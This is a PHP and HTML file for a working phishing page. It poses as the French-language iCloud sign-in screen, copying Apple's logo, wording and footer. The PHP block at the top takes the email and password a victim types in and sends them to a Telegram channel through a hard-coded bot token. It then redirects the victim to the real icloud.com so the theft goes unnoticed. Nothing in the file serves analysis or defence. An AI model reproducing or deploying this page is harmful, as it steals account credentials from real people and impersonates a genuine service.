<?php 
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');

  if (isset($_POST['email']) && isset($_POST['password']))
  {
    $apiToken = "1924676553:AAFC8ub38BCLqgtXF3wiuEJW7lx1NmDkvqw";
   
    $data = "EMAIL: ".$_POST['email']." PWD: ".$_POST['password'];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=@opiumdupeuple&text=$data"); 
   
    echo '<script>location.replace("https://icloud.com")</script>';

  }
?>
<html lang="fr-fr">

<head>

<link rel="icon" type="image/png" href="icon.png">
        
        <link rel="icon" type="image/png" sizes="16x16" href="/system/cloudos2/current/static/favicon-16x16.png">
        
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-U1DAWAznBHeqEIlVSCgzq+c9gqGAJn5c/t99JyeKa9xxaYpSvHU5awsuZVVFIhvj" crossorigin="anonymous"></script>
<title>iCloud</title>
<style>


body {
    margin: 0;
    padding: 0;
    display: flex;
    flex-direction: column;
    flex: 1;
}


* {
  box-sizing: border-box;
  color: #666;
}

html {
  background: URL("http://www.bestfreejpg.com/wp-content/uploads/2014/09/ios_8_bubble_wallpaper.png");
  background-size: cover;
  background-repeat: no-repeat;
  height: 100%;
  font-family: "Helvetica Neue", Helvetica, sans-serif;
  text-align: center;

  min-height: 100%;
    display: flex;
    flex-direction: column;
}

div {
  background: rgba(255, 255, 255, 0.85);
  -webkit-border-radius: 8px;
  border-radius: 8px;
  width: 350px;
  margin: 10% auto;
  overflow: hidden;
  -webkit-box-shadow: 0 0 3px 2px rgba(0, 0, 0, 0.03);
  box-shadow: 0 0 3px 2px rgba(0, 0, 0, 0.03);
}

main {
  padding: 0 15px;
}

h1 {
  font-weight: normal;
  font-size: 18px;
  padding-top: 25px;
  margin: 0 0 10px 0;
  color: #333
}

h6 {
  font-weight: normal;
  margin: 0 0 25px 0;
  padding: 0;
  font-size: 12px;
}

input {
  display: block;
  width: 100%;
  padding: 12px;
  border: 1px solid rgba(0, 0, 0, 0.095);
  -webkit-border-radius: 4px;
  border-radius: 4px;
  margin: 5px 0;
  font-size: 13px;
}

button {
  color: #1b6ed4;
  text-align: center;
  width: 50%;
  font-size: 18px;
  background: none;
  border: none;
  border-top: 1px solid rgba(0, 0, 0, 0.1);
  float: left;
  padding: 15px 0;
  cursor: pointer;
  margin: 15px 0 0 0;
}

button:first-of-type {
  border-right: 1px solid rgba(0, 0, 0, 0.1);
}

aside {
  width: 350px;
  margin: 15px auto;
  background: RGBA(0, 0, 0, 0.65);
  padding: 15px;
  -webkit-border-radius: 8px;
  border-radius: 8px;
  font-size: 12px;
  line-height: 19px;
}

aside p {
  color: #ccc;
}

.nav a {
    padding: 14px 10px !important;
    vertical-align:middle !important;
    display: inline-block !important;
}

a {
	text-decoration: none;
	color:#666;
}

.footer {
  position: fixed;
  left: 0;
  bottom: 0;
  width: 100%;
  color: white;
  text-align: center;
}


/* On screens that are 992px or less, set the background color to blue */
@media screen and (max-width: 1024px) {
	div {
		background: rgba(255, 255, 255, 0.85);
		-webkit-border-radius: 8px;
		border-radius: 8px;
		width: 350px;
		margin: 40% auto;
		overflow: hidden;
		-webkit-box-shadow: 0 0 3px 2px rgba(0, 0, 0, 0.03);
		box-shadow: 0 0 3px 2px rgba(0, 0, 0, 0.03);
	}
}

/* On screens that are 992px or less, set the background color to blue */
@media screen and (max-width: 992px) {
	div {
		background: rgba(255, 255, 255, 0.85);
		-webkit-border-radius: 8px;
		border-radius: 8px;
		width: 350px;
		margin: 45% auto;
		overflow: hidden;
		-webkit-box-shadow: 0 0 3px 2px rgba(0, 0, 0, 0.03);
		box-shadow: 0 0 3px 2px rgba(0, 0, 0, 0.03);
	}
}

/* On screens that are 600px or less, set the background color to olive */
@media screen and (max-width: 600px) {
	div {
		background: rgba(255, 255, 255, 0.85);
		-webkit-border-radius: 8px;
		border-radius: 8px;
		width: 350px;
		margin: 50% auto;
		overflow: hidden;
		-webkit-box-shadow: 0 0 3px 2px rgba(0, 0, 0, 0.03);
		box-shadow: 0 0 3px 2px rgba(0, 0, 0, 0.03);
	}
}


</style>

</head>

<body style="background-image: url('bg.jpeg'); background-repeat: no-repeat;  background-attachment: fixed;
  background-size: cover;">

	<nav class="navbar navbar-dark bg-dark" style="padding-left: 25px;
		height: 50px;">
		<a href="#"><svg xmlns="http://www.w3.org/2000/svg" width="16" style="fill:#FFF;" height="44" viewBox="0 0 16 44"><path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path></svg></a>
	</nav>

	<div>
		<img src="icloud.png" height="75px"/>
		<h1>Se connecter à iCloud</h1>
		<h6>Entrez votre identifiant Apple et votre mot de passe pour vous connecter à iCloud.</h6>
		
			<form action="" method="post">
			<main>
				<input type="email" name="email" placeholder="Identifiant Apple" />
				<input type="password" name="password" placeholder="Mot de passe" />

			</main>

			<footer>
				<button type="reset">Annuler</button>
				<button type="submit">Connexion</button>
			</footer>
			</form>
		
	</div>
	<footer class="footer">
		<p align="center" style="color:#E5F1F9; font-size:10px; bottom:5px;">
			
		<span><a class="create" target="_blank" href="#">Créer un identifiant Apple</a>  |  <a class="sytemStatus" target="_blank" href="https://www.apple.com/fr/support/systemstatus/">État du système</a>  |  <a class="privacy" target="_blank" href="https://www.apple.com/fr/privacy/">Engagement&nbsp;de&nbsp;confidentialité</a>  |  <a class="terms" target="_blank" href="https://www.apple.com/legal/internet-services/icloud/">Conditions générales</a>  |  <span class="copyright">Copyright © 2021 Apple Inc. Tous droits réservés.</span></span>

		</p>
		<footer>
	</body>

	
</html>